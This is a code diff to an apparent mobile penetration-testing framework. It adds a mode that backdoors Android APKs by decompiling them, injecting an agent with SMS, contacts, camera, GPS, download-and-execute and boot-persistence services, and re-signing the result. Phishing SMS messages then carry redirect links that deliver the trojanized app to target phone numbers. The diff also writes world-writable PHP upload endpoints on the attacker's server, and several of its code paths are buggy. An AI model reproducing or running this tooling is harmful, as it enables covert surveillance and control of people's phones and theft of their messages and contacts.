@@ -6,6 +6,8 @@ import subprocess
 import signal
 import getopt
 import re
+import xml.etree.ElementTree as ET
+import zipfile
 from lib.config import Config
 from lib.db import DB, DBException
 config = Config('config')
@@ -20,23 +22,28 @@ def usage():
     print "\t-u <url on webserver>"
     print "\t-d <delivery method> (sms/nfc)"
     print "\t-n/-N <number/file of numbers> to attack"
-    print "\t-p <page name>"
+    #print "\t-p <page name>"
     print "\t-t <custom text> for SMS"
     print "\t-c <page> to clone for credential harvester"
     print "\t-f <file> to import"
     print "\t-l <label> for campaign"
-    print "\t-a <appstore> link for hosted app (official or third party)"
+    print "\t-a <app(s)> to backdoor"
+    print "\t-k <key> to control app"
+    #print "\t-s <appstore> link for hosted app (official or third party)"
+    print "\t-s <signing> mechanism (masterkey,keystore file location)"
+    print "\t-p <password> for keystore"
+    print "\t-j <jarsigner> alias"
     print "-A <API> Start API (REST)"
     print "\t-u <url on webserver> for API"
     print "\t-k <api key>"
-    print "-S <poller> to shutdown (api, modem, all)"
+    print "-S <poller> to shutdown (api, modem, agent,all)"
     print "-R <reporting function> (get, drop)"
 def main(argv):
     if len(sys.argv) < 2:
         usage()
         sys.exit()
     try:
-        opts, args = getopt.getopt(argv, "M:A:P:n:u:k:S:c:N:p:t:d:l:R:f:a:")
+        opts, args = getopt.getopt(argv, "M:A:P:n:u:k:S:c:N:p:t:d:l:R:f:a:s:j:")
     except getopt.GetoptError:
         usage()
         sys.exit()
@@ -54,7 +61,13 @@ def main(argv):
     file = None
     numberfile = None
     appstore = None
-    text = "This is a cool page:"
+    backdoorapp = None
+    keystore = None
+    jarsignalias = None
+    keypass = None
+    signing = None
+    text = None
+    deliverymethod = "HTTP"
 
     for opt, arg in opts:
         if opt == '-M':
@@ -83,6 +96,7 @@ def main(argv):
                 page = arg
                 if page[0] != '/':
                    page = "/" + page
+                keypass = arg
 	if opt == '-k':
 		key = arg
         if opt == '-d':
@@ -91,13 +105,19 @@ def main(argv):
                 text = arg
         if opt == '-f':
                 file = arg
-        if opt == '-a':
+        if opt == '-s':
 		appstore = arg
         if opt == '-c':
                 clone = arg
 
         if opt == '-l':
                 campaignlabel = arg
+        if opt == '-a':
+		backdoorapp = arg
+        if opt == '-s':
+		signing = arg
+        if opt == '-j':
+		jarsignalias = arg
     if modem == True:
        
 	make_modem(number,url,key)
@@ -113,46 +133,444 @@ def main(argv):
        if phishtype == "harvester":
 	    harvesterphish(url,text,number,numberfile,campaignlabel,clone,page)
        if phishtype == "autoagent":
-	    autoagentphish(url,text,number,numberfile,page,appstore,text)
+	    autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,signing,jarsignalias,keypass,deliverymethod)
+
+def database_add_agents_1(number, path, key, number2, platform,deliverymethod):
+    table = "agents"
+    table2 = "agentsdata"
+    _type = config.get("DATABASETYPE")
+
+    db = DB(config=config)
+
+    db.query("INSERT INTO "+table+" (id,number,path,controlkey,controlnumber,platform,osversion,deliverymethod,active) VALUES (DEFAULT,%s,%s,%s,%s,%s,%s,%s,%s)", (number,path,key,number2,platform,"NULL",deliverymethod,"N"))
+    db.query("INSERT INTO "+table2+" (id,sms,contacts,picture,root,packages,apk) VALUES (DEFAULT, NULL, NULL, NULL, NULL, NULL, NULL)")
+
+def make_agent_files(path):
+    webserver = config.get("WEBSERVER")
+    fullpath = webserver + path
+    command1 = "mkdir " + fullpath
+    os.system(command1)
+    command11 = "chmod 777 " + fullpath
+    os.system(command11)
+    controlfile = fullpath + "/control"
+    command2 = "touch " + controlfile
+    os.system(command2)
+    command3 = "chmod 777 " + controlfile
+    os.system(command3)
+    picturefile = fullpath + "/picture.jpg"
+    command4 = "touch " + picturefile
+    os.system(command4)
+    command5 = "chmod 777 " + picturefile
+    os.system(command5)
+    textfile = fullpath + "/text.txt"
+    command6 = "touch " + textfile
+    os.system(command6)
+    command7 = "chmod 777 " + textfile
+    os.system(command7)
+    pictureupload = fullpath + "/pictureupload.php"
+    command8 = "touch " + pictureupload
+    os.system(command8)
+    command9 = "chmod 777 " + pictureupload
+    os.system(command9)
+    pictureuploadtext = "<?php\n$base=$_REQUEST['picture'];\necho $base;\n$binary=base64_decode($base);\nheader('Content-Type: bitmap; charset=utf-8');\n$file = fopen('picture.jpg', 'wb');\nfwrite($file, $binary);\nfclose($file);\n?>";
+    f = open(pictureupload, 'w')
+    f.write(pictureuploadtext)
+    f.close()
+    textupload = fullpath + "/textuploader.php"
+    command10 = "touch " + textupload
+    os.system(command10)
+    command11 = "chmod 777 " + textupload
+    os.system(command11)
+    textuploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('text.txt', 'wb');\nfwrite($file, $base);\n?>";
+    f = open(textupload, 'w')
+    f.write(textuploadtext)
+    f.close()
+    controlupload = fullpath + "/controluploader.php"
+    command12 = "touch " + controlupload
+    os.system(command12)
+    command13 = "chmod 777 " + controlupload
+    os.system(command13)
+    controluploadtext = "<?php\n$base=$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n$file = fopen('control','wb');\nfwrite($file, $base);\n?>";
+    f = open(controlupload, 'w')
+    f.write(controluploadtext)
+    f.close()
+    putfile = fullpath + "/putfunc"
+    command14 = "touch " + putfile
+    os.system(command14)
+    command15 = "chmod 777 " + putfile
+    os.system(command15)
+    appupload = fullpath + "/apkupload.php"
+    command12 = "touch " + appupload
+    os.system(command12)
+    command13 = "chmod 777 " + appupload
+    os.system(command13)
+    appuploadtext = "<?php\n$file_path = basename( $_FILES['uploadedfile']['name']);\n$f = fopen('text.txt', 'wb');\n$data = $file_path;\nfwrite($f, $data);\nfclose($f);\nif(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $file_path)) {\necho 'success';\n} else{\necho 'fail';\n}\n?>"
+    APPUPFILE = open(appupload, 'w')
+    APPUPFILE.write(appuploadtext)
+    APPUPFILE.close()
 
 
-def autoagentphish(url,text,number,numberfile,page,appstore):
+
+def autoagentphish(url,text,number,numberfile,page,appstore,backdoorapp,key,signing,jarsignalias,keypass,deliverymethod):
+    if text == None:
+        text = "This is a cool app: "
     webserver = config.get("WEBSERVER")
     ipaddress = config.get("IPADDRESS")
     androidagent = config.get("ANDROIDAGENT")
+    deletecontents(androidagent)
     iphoneagent = config.get("IPHONEAGENT")
+    db = DB(config=config)
+    db.query("create table if not exists agents (id SERIAL NOT NULL PRIMARY KEY, number varchar(12),path varchar(1000), controlkey varchar(7), controlnumber varchar(12), platform varchar(12), osversion varchar(10),deliverymethod varchar(10),active varchar(3))")
+    db.query("create table if not exists agentsdata (id SERIAL NOT NULL PRIMARY KEY, sms varchar(2000),contacts varchar(1000), picture varchar(100), root varchar(50), ping varchar(2000), file varchar(100), packages varchar(10000), apk varchar(100), ipaddress varchar(16))")
+    modem = 1
+    db.query("SELECT number from modems where id=%s", (modem,))
+    number2 = db.fetchone()[0]
     localpath = webserver + url
     if not os.path.exists(localpath):
             command1  = "mkdir " + localpath
             os.system(command1)
-    pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + path + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + path + "/androidagent.apk\');}"
-    sploitfile = localpath + page
-    command8   = "touch " + sploitfile
-    os.system(command8)
-    command9 = "chmod 777 " + sploitfile
-    os.system(command9)
-    SPLOITFILE = open(sploitfile, 'w')
-    SPLOITFILE.write(pagetext)
-    SPLOITFILE.close()
-    copy1 = "cp " + androidagent + " " + localpath + "/androidagent.apk"
-    copy2 = "cp " + iphoneagent + " " + localpath + "/iphoneagent.deb"
-    os.system(copy1)
-    os.system(copy2)
-    link = "http://" + ipaddress + url + page
-    if number != None:
+    if backdoorapp != None:
+    	if number != None:
+		androidbackdoor(backdoorapp,number,key,url,signing,jarsignalias,keypass,deliverymethod)
+                database_add_agents_1(number, "/" + number, key, number2, "Android")
+                page = "/" + number + ".php"
+                sploitfile = localpath + page
+                command8   = "touch " + sploitfile
+                os.system(command8)
+                command9 = "chmod 777 " + sploitfile
+                os.system(command9)
+                pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + url + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + url + "/" + number + ".apk\');};\n?>"
+                SPLOITFILE = open(sploitfile, 'w')
+                SPLOITFILE.write(pagetext)
+                SPLOITFILE.close()
+                make_agent_files("/" + number)
+                link = "http://" + ipaddress + url + page
                 fulltext = text + " " + link
-                sendsms(number,fulltext)
-    elif numberfile != None:
+                sendsms(line,fulltext)
+	elif numberfile != None:
                  with open(numberfile) as f:
                     lines = f.readlines()
                     for line in lines:
                         line = line.strip()
-                        fulltext = text +" " +link
+			androidbackdoor(backdoorapp,line,key,url,signing,jarsignalias,keypass,deliverymethod)
+                        database_add_agents_1(line, "/" + line, key, number2, "Android",deliverymethod)
+			page = "/" + line + ".php"
+    			sploitfile = localpath + page
+    			command8   = "touch " + sploitfile
+    			os.system(command8)
+    			command9 = "chmod 777 " + sploitfile
+    			os.system(command9)
+                        pagetext = "<?php\n$iphone = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"iPhone\");\n$android = strpos($_SERVER[\'HTTP_USER_AGENT\'],\"Android\");\nif\n($iphone == true)\n{header(\'Location: http://" + ipaddress + url + "/iphoneagent.deb\');}\nelseif ($android == true){\nheader(\'Location: http://" + ipaddress + url + "/" + line + ".apk\');};\n?>"
+    			SPLOITFILE = open(sploitfile, 'w')
+    			SPLOITFILE.write(pagetext)
+    			SPLOITFILE.close()
+                        make_agent_files("/" + line)
+                        link = "http://" + ipaddress + url + page
+			fulltext = text + " " + link
                         sendsms(line,fulltext)
+    copy1 = "cp " + androidagent + "*" + " " + localpath + "/"
+    os.system(copy1)
+    startcommand = "python agentattachpoller.py > log"
+    pid = os.fork()
+    if pid == 0:
+                os.system(startcommand)
 
-
-
+def deletecontents(folder):
+	for the_file in os.listdir(folder):
+    		file_path = os.path.join(folder, the_file)
+        	if os.path.isfile(file_path):
+            		os.unlink(file_path)
+def androidbackdoor(inputfile,number,key,url,signing,jarsignalias,keypass,deliverymethod):
+ 	  apktoolloc = config.get("APKTOOLLOC")
+          apksloc = config.get("APKSLOC")
+          os.chdir(apksloc)
+          copycom = "cp -rf AndroidAgentBAK AndroidAgent"
+          os.system(copycom) 
+          decompile = apktoolloc + "/apktool d " + inputfile + ">/dev/null"
+          os.system(decompile)
+          path,file = os.path.split(inputfile)
+          foldername = file[:-4]
+          ET.register_namespace("android", "http://schemas.android.com/apk/res/android")
+          tree = ET.ElementTree()
+          tree.parse(foldername + "/AndroidManifest.xml")
+          root = tree.getroot()
+          package = root.get('package')
+          for child in root:
+             if child.tag == "application":
+                app = child
+                for child in app:
+                        if child.tag == "activity":
+                                act = child
+                                for child in act:
+                                        if child.tag == "intent-filter":
+                                                filter = child
+                                                for child in filter:  
+                                                        if (filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[0].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
+                                                             if (filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.category.LAUNCHER" or  filter[1].get('{http://schemas.android.com/apk/res/android}name') == "android.intent.action.MAIN"):
+                                                                        mainact =  act.get('{http://schemas.android.com/apk/res/android}name')
+                                                                        if mainact[0] == ".":
+                                                                             mainact = package + mainact
+                                                                        act.remove(filter)
+                                                                        tree.write("output.xml")
+                                                                        break
+          movecommand = "mv output.xml " + foldername  + "/AndroidManifest.xml"
+          os.system(movecommand)
+          mainactsplit = mainact.split(".")
+          length = len(mainactsplit)
+          classname = mainactsplit[length - 1]
+          package = mainactsplit[0] + "."
+          for x in range(1, (length - 2)):
+                 add = mainactsplit[x] + "."
+          	 package += add
+          package += mainactsplit[length - 2]
+          appmain = package + "." + classname + ".class"
+          mainfile = "AndroidAgent/src/com/bulbsecurity/framework/AndroidAgentActivity.java"
+          inject = "\n        Intent intent2 = new Intent(getApplicationContext(), " + appmain +  ");\nstartActivity(intent2);\n"
+          with open(mainfile, 'r') as f:
+              fc = f.read()
+          with open(mainfile, 'w') as f:
+              f.write(re.sub(r'(finish)', r'%s\1'%inject, fc, count=1))
+          newfolder = "src/" + mainactsplit[0] + "/"
+          os.system("mkdir AndroidAgent/" + newfolder + ">/dev/null")
+          for x in range(1, (length - 1)):
+              add = mainactsplit[x] + "/"
+              newfolder += add
+              os.system("mkdir AndroidAgent/" + newfolder + ">/dev/null")  
+          fullclasspath =  "AndroidAgent/" + newfolder + classname + ".java"
+          os.system("touch " + fullclasspath)
+          f = open(fullclasspath, 'w')
+          line1 = "package " + package + ";\n"
+          line2 = "import android.app.Activity;\n"
+          line3 = "public class " + classname + " extends Activity {\n"
+          line4 = "}\n"
+          f.write(line1)
+          f.write(line2)
+          f.write(line3)
+          f.write(line4)
+          f.close()
+          androidsdk = config.get("ANDROIDSDK")
+          command = androidsdk + "/tools/android update project --name AndroidAgent" + " --path " + "AndroidAgent/" + ">/dev/null"
+          os.system(command)
+          command = "ant -f " + "AndroidAgent" +  "/build.xml clean debug"  + ">/dev/null"
+          #command = "ant -f " + "AndroidAgent" + "/build.xml release" 
+          os.system(command)
+          decompile = apktoolloc + "/apktool d " + "AndroidAgent/bin/AndroidAgent-debug.apk" + " -o AndroidAgent2/"  + ">/dev/null"
+          os.system(decompile)
+          os.system("mkdir " + foldername + "/smali/com")
+          os.system("cp -rf AndroidAgent2/smali/com/bulbsecurity " + foldername + "/smali/com/")
+          os.system("mkdir " + foldername + "/smali/jackpal")
+          os.system("cp -rf AndroidAgent2/smali/jackpal " + foldername + "/smali/")
+          manifestfile = foldername + "/AndroidManifest.xml"
+          inject = """
+          <receiver android:name="com.bulbsecurity.framework.SMSReceiver">
+          <intent-filter android:priority="999"><action android:name="android.provider.Telephony.SMS_RECEIVED" /></intent-filter>
+          </receiver>
+          <service android:name="com.bulbsecurity.framework.SMSService">
+          </service>
+          <receiver android:name="com.bulbsecurity.framework.ServiceAutoStarterr">
+          <intent-filter ><action android:name="android.intent.action.BOOT_COMPLETED"></action></intent-filter>
+          </receiver>
+          <receiver android:name="com.bulbsecurity.framework.AlarmReceiver" android:process=":remote"></receiver>
+          <service android:name="com.bulbsecurity.framework.CommandHandler">
+          </service>
+          <service android:name="com.bulbsecurity.framework.PingSweep">
+          </service>
+          <service android:name="com.bulbsecurity.framework.SMSGet">
+          </service>
+          <service android:name="com.bulbsecurity.framework.ContactsGet">
+          </service>
+          <service android:name="com.bulbsecurity.framework.InternetPoller">
+          </service>
+          <service android:name="com.bulbsecurity.framework.WebUploadService">
+          </service>
+          <service android:name="com.bulbsecurity.framework.PictureService">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Download">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Execute">
+          </service>
+          <service android:name="com.bulbsecurity.framework.GetGPS">
+          </service>
+	  <service android:name="com.bulbsecurity.framework.IPGet">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Checkin">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Listener"></service>
+          <service android:name="com.bulbsecurity.framework.Phase1" android:process=":three">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Phase2" android:process=":two">
+          </service>
+          <service android:name="com.bulbsecurity.framework.Exynos"></service>
+          <service android:name="com.bulbsecurity.framework.Upload"></service>
+          <activity android:name="com.bulbsecurity.framework.AndroidAgentActivity">
+          <intent-filter>
+          <action android:name="android.intent.action.MAIN" />
+          <category android:name="android.intent.category.LAUNCHER" />
+          </intent-filter>
+          </activity>
+          """
+          with open(manifestfile, 'r') as f:
+              fc = f.read()
+          with open(manifestfile, 'w') as f:
+              f.write(re.sub(r'(<\/application>)', r'%s\1'%inject, fc, count=1))
+          inject = """
+          <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+          <uses-permission android:name="android.permission.INTERNET" />
+          <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+          <uses-permission android:name="android.permission.SEND_SMS"/>
+          <uses-permission android:name="android.permission.CAMERA"/>
+          <uses-permission android:name="android.permission.READ_CONTACTS"/>
+          <uses-permission android:name="android.permission.INTERNET"/>
+          <uses-permission android:name="android.permission.READ_SMS"/>
+          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+          <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+          <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+          <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+          <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+          <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+          """
+          with open(manifestfile, 'r') as f:
+               fc = f.read()
+          with open(manifestfile, 'w') as f:
+               f.write(re.sub(r'(<uses-permission)', r'%s\1'%inject, fc, count=1))
+          stringfile = foldername + "/res/values/strings.xml" 
+          inject = """
+          <string name="key">KEYKEY1</string>
+          <string name="controlnumber">155552155554</string>
+          <string name="controlIP">192.168.1.108</string>
+          <string name="urii">/control</string>
+          <string name="controlpath">/androidagent1</string>
+          """
+          if os.path.exists(stringfile):
+               with open(stringfile, 'r') as f:
+                    fc = f.read()
+               with open(stringfile, 'w') as f:
+                    f.write(re.sub(r'(<\/resources>)', r'%s\1'%inject, fc, count=1))
+          else:
+               inject2 = """
+               <?xml version="1.0" encoding="utf-8"?>
+               <resources>
+               """
+               os.system("touch " + stringfile)
+               with open(stringfile, 'w') as f:
+                  f.write(inject2)  
+                  f.write(inject)
+                  f.write("</resources>")
+	  modem = 1
+          db = DB(config=config)
+          controlpath = "/" + number
+          controlkey = key
+          db.query("SELECT number from modems where id=%s", (modem,))
+          controlphone = db.fetchone()[0]
+          ipaddress = config.get("IPADDRESS")
+          fullpath1 = apksloc + "/" + foldername + "/res/values/strings.xml"
+          command = "sed -i \'s/<string name=\"key\">.*/<string name=\"key\">" + controlkey + "<\\/string>/' " + fullpath1
+          os.system(command)
+          command = "sed -i \'s/<string name=\"controlnumber\">.*/<string name=\"controlnumber\">" + controlphone + "<\\/string>/' " + fullpath1
+          os.system(command)
+          command = "sed -i \'s/<string name=\"controlIP\">.*/<string name=\"controlIP\">" + ipaddress + "<\\/string>/' " + fullpath1
+          os.system(command)
+          command = "sed -i \'s/<string name=\"controlpath\">.*/<string name=\"controlpath\">\\" + controlpath + "<\\/string>/' " + fullpath1
+          os.system(command)
+          xml_path = foldername + '/res/values/styles.xml'
+          if os.path.exists(xml_path):
+              tree = ET.parse(xml_path)
+              for child in tree.findall('.//*[@parent]'):
+                    if child.get('parent').startswith('@*android:style/'):
+                        new_parent = child.get('parent').replace('@*android:style/','@android:style/')
+                        child.set('parent', new_parent)
+              tree.write(xml_path)
+          os.environ["PATH"] = os.environ["PATH"] + ":" + apktoolloc
+          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk"  + ">/dev/null"
+          os.system(compile)
+          remove = "rm -rf " + foldername 
+          os.system(remove)
+          decomp = apktoolloc + "/apktool d Backdoored/" + foldername + ".apk -o" + foldername + "/"    + ">/dev/null"
+          os.system(decomp)
+          tree = ET.ElementTree()
+          tree.parse(foldername + "/res/values/public.xml")
+          root = tree.getroot()
+          for child in root:
+              if (child.get('name') == "key" ):
+                  newkeyvalue = child.get('id')
+              if (child.get('name') == "urii" ):
+                  newuriivalue = child.get('id')
+              if (child.get('name') == "controlIP" ):
+                  newcontrolIPvalue = child.get('id')
+              if (child.get('name') == "controlnumber" ):
+                  newcontrolnumbervalue = child.get('id')
+              if (child.get('name') == "controlpath" ):
+                  newcontrolpathvalue = child.get('id')
+          oldkeyvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep key | cut -d" " -f7').read().strip()
+          olduriivalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep urii | cut -d" " -f7').read().strip()
+          oldcontrolIPvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlIP | cut -d" " -f7').read().strip()
+          oldcontrolpathvalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlpath | cut -d" " -f7').read().strip()
+          oldcontrolnumbervalue = os.popen('cat ' + foldername + '/smali/com/bulbsecurity/framework/R\$string.smali | grep controlnumber | cut -d" " -f7').read().strip()
+          for dname, dirs, files in os.walk(foldername + "/smali/com/bulbsecurity/framework"):
+              for fname in files:
+                  fpath = os.path.join(dname, fname)
+                  with open(fpath) as f:
+                    s = f.read()
+                    s = s.replace(oldkeyvalue, newkeyvalue)
+                    s = s.replace(olduriivalue, newuriivalue)
+                    s = s.replace(oldcontrolIPvalue, newcontrolIPvalue)
+                    s = s.replace(oldcontrolpathvalue, newcontrolpathvalue)
+                    s = s.replace(oldcontrolnumbervalue, newcontrolnumbervalue)
+                  with open(fpath, "w") as f:
+                    f.write(s)
+          xml_path = foldername + '/res/values/styles.xml'
+          if os.path.exists(xml_path):
+              tree = ET.parse(xml_path)
+              for child in tree.findall('.//*[@parent]'):
+                  if child.get('parent').startswith('@*android:style/'):
+                      new_parent = child.get('parent').replace('@*android:style/','@android:style/')
+                      child.set('parent', new_parent)
+              tree.write(xml_path)
+          remove = "rm Backdoored/" + foldername + ".apk"
+          os.system(remove)
+          compile = apktoolloc + "/apktool b " + foldername + " -o Backdoored/" + foldername + ".apk" + ">/dev/null"
+          os.system(compile)
+          if signing == None: 
+		signing = config.get("KEYSTORELOC")
+          if signing != "master":      
+                if jarsignalias == None:
+                      jarsignalias = config.get("KEYALIAS")
+                if keypass == None:
+			keypass = config.get("KEYPASS")
+                signcommand =  "jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore " + signing +" -storepass " + keypass + " Backdoored/" + foldername + ".apk " +  jarsignalias + ">/dev/null"
+                os.system(signcommand)
+                androidagentlocation = config.get("ANDROIDAGENT")
+                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation + number + ".apk"
+                os.system(copycommand)
+          if signing == "master":
+                unzipcom = "unzip " + inputfile + " -d unzipped/"
+                os.system(unzipcom)
+                os.chdir("unzipped")
+                currentdir = os.getcwd()
+                zip = zipfile.ZipFile("../Backdoored/" + foldername + ".apk", "a")
+                for root, subFolders, files in os.walk(currentdir):
+                        for file in files:
+                                file2 = os.path.join(root.replace(currentdir, "", 1), file).lstrip('/')
+                                zip.write(file2)
+                zip.close()
+                os.chdir("..")
+                androidagentlocation = config.get("ANDROIDAGENT")
+                copycommand = "cp Backdoored/" + foldername + ".apk " +androidagentlocation + number + ".apk"
+                os.system(copycommand)
+                remove = "rm -rf unzipped"
+                os.system(remove)
+          rem = "rm -rf " + foldername
+          os.system(rem)
+          rem = "rm -rf AndroidAgent"
+          os.system(rem)
+          rem = "rm -rf AndroidAgent2"
+          os.system(rem)
+          dagahloc = config.get("DAGAHLOC")
+          os.chdir(dagahloc)
+	  print "Backdoored " + inputfile + " for " + number
 def harvesterphish(url,text,number,numberfile,campaignlabel,clone,page):
+         if text == None:
+		text = "This is a cool page: "
 	 webserver = config.get('WEBSERVER')
        	 ipaddress = config.get('IPADDRESS')
          localpath = webserver + url
@@ -287,6 +705,8 @@ def reporter(reporttype):
 
 
 def basicphish(url,text,number,numberfile,campaignlabel):
+       if text == None:
+		text = "This is a cool page: " 
        webserver = config.get('WEBSERVER')
        ipaddress = config.get('IPADDRESS')
        localpath = webserver + url
@@ -356,9 +776,20 @@ def stop_poller(poller):
 		p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
           	out, err = p.communicate()
           	for line in out.splitlines():
-             		if 'poller.py' in line:
+             		if 'modempoller.py' in line:
                 		pid = int(line.split()[1])
                 		os.kill(pid, signal.SIGKILL)
+        if poller == "agent" or "all":
+           	p = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
+                out, err = p.communicate()
+                for line in out.splitlines():
+                        if 'agentpoller.py' in line:
+                                pid = int(line.split()[1])
+                                os.kill(pid, signal.SIGKILL)
+		db = DB(config=config)
+                db.query("DROP TABLE IF EXISTS agents")
+                db.query("DROP TABLE IF EXISTS agentdata")
+
 def make_api(path,key):
             make_apifiles(path)
             startcommand = "python apipoller.py " + path + " " + key + " > log"
@@ -423,7 +854,7 @@ def make_modem(number,url,key):
         handshake(url,key)
         modemtype = "app"
         database_add2(number,url,key,modemtype)
-        startcommand = "python poller.py " + url + " " + key + " > log"
+        startcommand = "python modempoller.py " + url + " " + key + " > log"
         pid = os.fork()
         if pid == 0:
                 os.system(startcommand) 
